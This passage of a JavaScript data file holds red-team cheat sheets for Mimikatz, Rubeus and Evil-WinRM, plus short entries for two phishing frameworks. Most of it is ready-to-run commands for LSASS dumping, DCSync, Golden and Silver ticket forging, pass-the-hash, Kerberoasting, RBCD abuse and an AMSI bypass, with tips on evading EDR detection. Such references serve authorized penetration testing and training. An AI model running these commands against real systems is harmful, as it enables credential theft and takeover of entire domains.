        ]
      }
    ]
  },
  {
    category: "Post Exploitation",
    tools: [
      {
        id: "mimikatz",
        name: "Mimikatz",
        url: "https://github.com/gentilkiwi/mimikatz",
        description: "Windows credential extraction — LSASS dumping, Kerberos tickets, DPAPI, and more.",
        brief: "Mimikatz reads credential material straight out of Windows memory and secret stores: plaintext/hash/Kerberos material from LSASS, tickets from the Kerberos cache, DPAPI-protected secrets, cached domain credentials, and more. It's also how Golden and Silver tickets get forged once a krbtgt or service-account hash is in hand.\n\nIt is one of the most heavily signatured tools that exists — assume default Defender/EDR flags the binary on sight. Running it live, on disk, unmodified is rarely viable outside a lab; in-memory execution (Cobalt Strike execute-assembly, PowerShell reflection, SafetyKatz-style forks) or offline analysis of a dumped LSASS process is the realistic path on a real engagement.",
        quickReference: [
          { label: "Required first command, every session", cmd: "privilege::debug" },
          { label: "Dump all logon credentials in memory", cmd: "sekurlsa::logonpasswords" },
          { label: "Dump an offline LSASS minidump instead of live memory", cmd: "sekurlsa::minidump lsass.dmp" },
          { label: "DCSync a target account (needs Replicating Directory Changes rights)", cmd: "lsadump::dcsync /user:corp\\krbtgt" },
          { label: "Forge and inject a Golden Ticket", cmd: "kerberos::golden /user:administrator /domain:corp.local /sid:<domain_sid> /krbtgt:<hash> /ptt" }
        ],
        sections: [
          {
            title: "Setup & Requirements",
            type: "table",
            columns: ["Command / Concept", "Description"],
            rows: [
              ["privilege::debug", "Elevates to SeDebugPrivilege — required before touching LSASS memory, run this first in every session"],
              ["token::elevate", "Steal a SYSTEM token when running as local admin but not already SYSTEM"],
              ["Architecture match", "The mimikatz.exe build (x86/x64) must match the target process's architecture, not just the OS"],
              ["Credential Guard", "When enabled, blocks most sekurlsa:: reads even with debug privilege and local admin — check for it before assuming a dump will work"],
              ["AV / EDR", "Assume the binary is signatured; use in-memory loaders (execute-assembly, PowerShell reflection) or a renamed/obfuscated fork rather than dropping mimikatz.exe to disk"]
            ]
          },
          {
            title: "Credential Dumping",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["sekurlsa::logonpasswords", "Dump all currently logged-on credentials — plaintext where WDigest/etc. permit it, NTLM hash otherwise"],
              ["sekurlsa::minidump <file>", "Load an offline LSASS minidump (from procdump/Task Manager) instead of reading live memory — much quieter"],
              ["sekurlsa::wdigest", "WDigest-cached plaintext credentials specifically (disabled by default since Win8.1/2012R2, but worth checking)"],
              ["sekurlsa::msv", "NTLM hashes only, no plaintext attempt"],
              ["sekurlsa::tspkg", "Credentials cached by the TSPKG provider (RDP/Terminal Services sessions)"],
              ["sekurlsa::ssp", "Credentials cached by the SSP provider"],
              ["lsadump::sam", "Local SAM database — local account hashes"],
              ["lsadump::secrets", "LSA secrets — service account passwords, auto-logon credentials, etc."],
              ["lsadump::cache", "Cached domain logon credentials (MSCache/DCC2) — crackable but not directly usable for pass-the-hash"]
            ]
          },
          {
            title: "Kerberos Ticket Operations",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["kerberos::list", "List Kerberos tickets currently in memory for the session"],
              ["sekurlsa::tickets /export", "Dump every ticket in memory to .kirbi files, from any logged-on session"],
              ["kerberos::ptt <ticket.kirbi>", "Pass-the-ticket — inject a ticket into the current logon session"],
              ["kerberos::purge", "Clear the current session's ticket cache before injecting a new one"]
            ]
          },
          {
            title: "Golden & Silver Tickets",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["kerberos::golden /user:<u> /domain:<d> /sid:<sid> /krbtgt:<hash> /ptt", "Forge a Golden Ticket (full domain-wide TGT) using the krbtgt account's hash — grants access as any user, to anything"],
              ["/aes256:<key> instead of /krbtgt:<ntlm>", "Forge using the krbtgt's AES256 key instead of RC4 — quieter in AES-enforced environments"],
              ["kerberos::golden /user:<u> /domain:<d> /sid:<sid> /target:<spn_host> /service:<svc> /rc4:<svc_hash> /ptt", "Forge a Silver Ticket — scoped to one specific service, using that service account's hash instead of krbtgt's"],
              ["/ptt vs /ticket:<file>", "/ptt injects directly into the current session; /ticket writes a .kirbi to use later or from another host"]
            ]
          },
          {
            title: "DCSync",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["lsadump::dcsync /user:<domain>\\krbtgt", "Pull the krbtgt hash remotely via the directory replication protocol — the usual first move toward a Golden Ticket"],
              ["lsadump::dcsync /user:<domain>\\<user>", "Pull any other account's hash the same way"],
              ["Requirement", "Needs Replicating Directory Changes + Replicating Directory Changes All rights — Domain Admins/Enterprise Admins have it by default, but so can any account this has been delegated to"]
            ]
          },
          {
            title: "Other Credential Sources",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["dpapi::masterkey /in:<file> /sid:<sid> /password:<pass>", "Decrypt a DPAPI masterkey using the user's password or domain backup key"],
              ["dpapi::cred /in:<file> /masterkey:<key>", "Decrypt a DPAPI-protected credential blob once the masterkey is known"],
              ["vault::cred", "Dump Windows Credential Vault entries (saved RDP/web credentials)"],
              ["crypto::capi / crypto::cng", "Patch CryptoAPI/CNG to allow exporting normally non-exportable private keys"]
            ]
          },
          {
            title: "Pass-the-Hash / Pass-the-Ticket",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe", "Spawn a new process under a forged logon session using just an NTLM hash — no plaintext password needed"],
              ["kerberos::ptt <ticket.kirbi>", "Same idea for Kerberos — inject a ticket (legitimate, golden, or silver) into the current session"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard live credential dump", cmd: "privilege::debug\nsekurlsa::logonpasswords" },
              { label: "Safer offline dump-and-parse (avoids running mimikatz live)", cmd: "# on target, via a minidump tool:\nrundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full\n# transfer lsass.dmp off-host, then locally:\nmimikatz.exe\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords" },
              { label: "DCSync → Golden Ticket → domain-wide access", cmd: "privilege::debug\nlsadump::dcsync /user:corp\\krbtgt\n# using the recovered hash:\nkerberos::purge\nkerberos::golden /user:administrator /domain:corp.local /sid:<domain_sid> /krbtgt:<hash> /ptt\n# current session now holds a domain-wide forged TGT" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Run privilege::debug first, every time — most other commands silently fail without it.",
              "Prefer offline minidump analysis or in-memory execution over dropping mimikatz.exe to disk — it's one of the most heavily signatured tools in the industry.",
              "Credential Guard (on by default on many modern builds) blocks most live sekurlsa:: reads even as SYSTEM — check for it before spending time troubleshooting a dump that will never work.",
              "A Golden Ticket built from a stale krbtgt hash still works until the krbtgt password is rotated (twice, with the standard AD guidance) — rotating krbtgt is the actual remediation, not just resetting user passwords.",
              "These techniques directly forge or extract domain identities — confirm written authorization before running any of them outside a lab."
            ]
          }
        ]
      },
      {
        id: "rubeus",
        name: "Rubeus",
        url: "https://github.com/GhostPack/Rubeus",
        description: "Kerberos abuse toolkit — roasting, ticket requests, delegation abuse, and ticket forging.",
        brief: "Rubeus is the modern, actively maintained Kerberos attack tool from the GhostPack suite — a single .NET binary that covers almost every practical Kerberos abuse technique: Kerberoasting, ASREPRoasting, ticket requests and injection, S4U/delegation abuse, overpass-the-hash, and Golden/Silver ticket forging. It runs standalone or in-memory via execute-assembly, and is generally the more opsec-flexible choice over ad-hoc PowerShell/Impacket scripting when you're already on a Windows host.",
        quickReference: [
          { label: "Kerberoast every roastable account", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt" },
          { label: "ASREPRoast every pre-auth-disabled account", cmd: "Rubeus.exe asreproast /outfile:hashes.txt" },
          { label: "Request a TGT from creds", cmd: "Rubeus.exe asktgt /user:<user> /password:<pass> /domain:<domain> /ptt" },
          { label: "Pass-the-ticket", cmd: "Rubeus.exe ptt /ticket:<base64_or_file>" },
          { label: "S4U2Proxy delegation abuse, straight to a usable ticket", cmd: "Rubeus.exe s4u /user:<svc>$ /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /ptt" }
        ],
        sections: [
          {
            title: "Ticket Requests",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["asktgt /user:<u> /password:<p> /domain:<d> /ptt", "Request a TGT using a plaintext password and inject it into the current session"],
              ["asktgt /user:<u> /rc4:<hash> /domain:<d> /ptt", "Same, but via NTLM hash (\"overpass-the-hash\") instead of a password"],
              ["asktgt /user:<u> /aes256:<key> /domain:<d> /ptt", "Same, via the account's AES256 key — quieter in AES-enforced environments than falling back to RC4"],
              ["asktgs /ticket:<tgt> /service:<spn> /ptt", "Exchange a TGT for a service ticket (TGS) against a specific SPN"],
              ["renew /ticket:<file> /ptt", "Renew a renewable ticket that's approaching expiry"],
              ["harvest /interval:<sec>", "Continuously monitor and dump newly created TGTs from memory as they appear"],
              ["triage", "List every ticket currently in memory across all logon sessions on the host — a quick win-scan for interesting cached TGTs"]
            ]
          },
          {
            title: "Kerberoasting",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["kerberoast /outfile:hashes.txt", "Request service tickets for every account with an SPN and dump crackable hashes to file"],
              ["/user:<target>", "Scope to a single target account instead of every roastable account in the domain"],
              ["/stats", "List roastable accounts and their encryption support without actually requesting tickets"],
              ["/rc4opsec", "Only roast accounts that support RC4, skipping ones that would otherwise get force-downgraded — avoids an encryption-downgrade detection signal"],
              ["/aes", "Prefer AES-encrypted tickets where supported — slower to crack but quieter in AES-enforced environments"],
              ["/tgtdeleg", "Kerberoast without needing direct account credentials, by abusing TGT delegation — useful from an unprivileged context"]
            ]
          },
          {
            title: "ASREPRoasting",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["asreproast /outfile:hashes.txt", "Request AS-REP for every account with Kerberos pre-authentication disabled and dump crackable hashes"],
              ["/user:<target>", "Scope to one specific account known to have pre-auth disabled"],
              ["No credentials required", "Unlike Kerberoasting, this technique needs no valid domain credentials at all — just network access to a DC"]
            ]
          },
          {
            title: "Ticket Manipulation",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["ptt /ticket:<file_or_base64>", "Inject a ticket into the current logon session"],
              ["purge", "Clear all tickets from the current session before injecting a new one"],
              ["describe /ticket:<file>", "Parse and print the contents of a .kirbi file without injecting it"],
              ["dump", "Dump every ticket currently held by the current session"],
              ["klist", "List tickets for the current session (like the built-in klist.exe, but Rubeus-native)"]
            ]
          },
          {
            title: "Delegation Abuse (S4U)",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["s4u /user:<svc>$ /rc4:<hash> /impersonateuser:<target> /msdsspn:<spn> /ptt", "S4U2Self + S4U2Proxy chain — impersonate any user against a service the controlled account has constrained/RBCD delegation to"],
              ["/altservice:<spn>", "Request the resulting ticket for a different SPN than the one configured — works when the target has multiple SPNs registered"],
              ["monitor /interval:<sec> /filteruser:<account>", "Watch for a specific account's TGT to land in memory — the standard way to actually capture a session on a host with unconstrained delegation"],
              ["Typical RBCD pairing", "Create/control a computer account (via bloodyAD or StandIn) → set msDS-AllowedToActOnBehalfOfOtherIdentity → s4u here to get a ticket as anyone"]
            ]
          },
          {
            title: "Overpass-the-Hash / Pass-the-Key",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["asktgt /user:<u> /rc4:<hash> /ptt", "Turn an NTLM hash into a full Kerberos TGT — \"overpass-the-hash\""],
              ["/opsec", "Request the ticket in a way that more closely matches normal Windows ticket-request behavior, reducing detection signal"],
              ["createnetonly /program:cmd.exe", "Spawn a sacrificial logon session (like runas /netonly) to inject a ticket into, instead of touching the current one"]
            ]
          },
          {
            title: "Golden / Silver Tickets",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["golden /rc4:<krbtgt_hash> /sid:<sid> /user:<u> /domain:<d> /ptt", "Forge a Golden Ticket from a compromised krbtgt hash"],
              ["silver /service:<spn> /rc4:<svc_hash> /sid:<sid> /user:<u> /domain:<d> /ptt", "Forge a Silver Ticket scoped to one service, from that service account's hash"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Kerberoast → crack → PtH/overpass-the-hash", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt\nhashcat -m 13100 hashes.txt rockyou.txt\n# once cracked, use the plaintext directly or:\nRubeus.exe asktgt /user:svc_sql /password:<cracked_pass> /domain:corp.local /ptt" },
              { label: "Opsec-safe overpass-the-hash into a sacrificial session", cmd: "Rubeus.exe createnetonly /program:cmd.exe\n# in the new process, from the same or another Rubeus instance targeting that PID:\nRubeus.exe asktgt /user:administrator /aes256:<key> /domain:corp.local /ptt /opsec" },
              { label: "RBCD abuse chain (with bloodyAD for the AD-write step)", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add computer EVILPC 'Passw0rd123!'\nbloodyAD -d corp.local -u user -p pass --host <dc> add rbcd <target_computer> 'EVILPC$'\nRubeus.exe s4u /user:EVILPC$ /rc4:<evilpc_hash> /impersonateuser:administrator /msdsspn:cifs/<target_computer> /ptt" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Use a matching architecture build and run in-memory (execute-assembly, reflective loading) where possible — Rubeus is signatured almost as heavily as Mimikatz on a monitored endpoint.",
              "Prefer /aes over forcing RC4 in AES-enforced environments — an unexpected RC4 ticket request is itself a detection signal in some SIEM rulesets.",
              "/opsec and createnetonly exist specifically to make ticket injection look more like normal Windows behavior — use them rather than injecting straight into an interactive logon session when it matters.",
              "Combine with Certipy (PKINIT-based ticket requests from a certificate) or bloodyAD (the AD-write half of an RBCD chain) — Rubeus generally handles the Kerberos side, not the directory-write side."
            ]
          }
        ]
      },
      {
        id: "evil-winrm",
        name: "Evil-WinRM",
        url: "https://github.com/Hackplayers/evil-winrm",
        description: "Interactive WinRM shell for Windows targets — the standard way in once you have valid credentials.",
        brief: "Evil-WinRM is a ruby-based interactive shell over WinRM (ports 5985/5986) with built-in support for password, hash, and Kerberos authentication, plus quality-of-life features other WinRM clients don't have: file upload/download, in-memory .NET/PowerShell execution, and a built-in AMSI bypass helper. It's usually the first thing tried once a set of working credentials is confirmed against a Windows host.",
        quickReference: [
          { label: "Password auth", cmd: "evil-winrm -i <target> -u <user> -p <pass>" },
          { label: "Pass-the-hash", cmd: "evil-winrm -i <target> -u <user> -H <nt_hash>" },
          { label: "Force HTTPS (port 5986)", cmd: "evil-winrm -i <target> -u <user> -p <pass> -S" },
          { label: "Upload a file, from inside the shell", cmd: "upload /local/path/file.exe C:\\Windows\\Temp\\file.exe" },
          { label: "Bypass AMSI, from inside the shell", cmd: "Bypass-4MSI" }
        ],
        sections: [
          {
            title: "Authentication",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-i / --ip <target>", "Target host"],
              ["-u / --user <user>", "Username to authenticate as"],
              ["-p / --password <pass>", "Password authentication"],
              ["-H / --hash <nt_hash>", "Pass-the-hash — NT hash instead of a password"],
              ["-r / --realm <domain>", "Kerberos authentication, using a ticket already present in the environment (e.g. exported from Rubeus/Impacket and set via KRB5CCNAME)"],
              ["-S / --ssl", "Use HTTPS WinRM (port 5986) instead of plain HTTP (5985)"],
              ["-P / --port <port>", "Override the default WinRM port"],
              ["-c / --pub-key-cert & -k / --priv-key-cert", "Certificate-based authentication, when supported by the target"]
            ]
          },
          {
            title: "In-Shell Commands",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["upload <local> <remote>", "Upload a file to the target"],
              ["download <remote> <local>", "Download a file from the target"],
              ["menu", "List every Evil-WinRM built-in helper function available in the current session"],
              ["Bypass-4MSI", "Built-in AMSI patch — run before loading anything AMSI would otherwise flag"],
              ["Invoke-Binary <path> [args]", "Execute a local/remote .NET binary in memory, without writing it to disk on the target"],
              ["services", "List Windows services and their status from inside the shell"],
              ["dllloader <dll_path> <function>", "Load and invoke a specific function from an unmanaged DLL in memory"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard password-auth session, then upload + run a tool", cmd: "evil-winrm -i 10.10.10.10 -u jsmith -p 'Passw0rd123!'\n*Evil-WinRM* PS> upload /opt/tools/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe\n*Evil-WinRM* PS> Invoke-Binary /opt/tools/SharpHound.exe -c All" },
              { label: "Pass-the-hash session", cmd: "evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" },
              { label: "Kerberos-ticket session (ticket obtained elsewhere)", cmd: "export KRB5CCNAME=/tmp/administrator.ccache\nevil-winrm -i dc01.corp.local -u administrator -r corp.local" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Requires WinRM to be enabled on the target and the authenticating account to be in the local Administrators or Remote Management Users group — a valid credential alone isn't sufficient if WinRM access hasn't been granted.",
              "Run Bypass-4MSI early in a session before loading anything that would normally trip AMSI on a Defender-enabled host.",
              "Invoke-Binary keeps tools off disk on the target, which matters far more on monitored hosts than on a lab box.",
              "-S / HTTPS is worth trying by default on hardened environments — some hosts disable plain HTTP WinRM entirely."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Phishing",
    tools: [
      {
        id: "evilginx2",
        name: "Evilginx2",
        url: "https://github.com/kgretzky/evilginx2",
        description: "Man-in-the-middle phishing framework for capturing credentials and session tokens, including 2FA bypass."
      },
      {
        id: "gophish",
        name: "Gophish",
        url: "https://github.com/gophish/gophish",
        description: "Open-source phishing campaign framework — templates, landing pages, and campaign tracking."
      }
    ]
  }
];